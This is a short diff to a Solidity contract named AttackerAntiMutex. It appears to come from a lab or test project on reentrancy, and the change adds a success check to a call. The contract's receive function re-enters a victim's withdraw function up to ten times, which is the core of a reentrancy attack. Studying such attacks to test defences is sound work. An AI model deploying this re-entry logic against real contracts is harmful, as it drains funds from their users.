@@ -20,13 +20,15 @@ contract AttackerAntiMutex {
   receive() external payable {
     count++;
     emit LogFallback(count, address(this).balance);
+    
     if (count < 10) {
       v.withdraw(amount);
     } 
   }
 
   function setBalance() public payable {
-     victimAddress.call{value: msg.value}("");
+     (bool success, ) = victimAddress.call{value: msg.value}("");
+     require(success);
   }
 
   function attack() public {
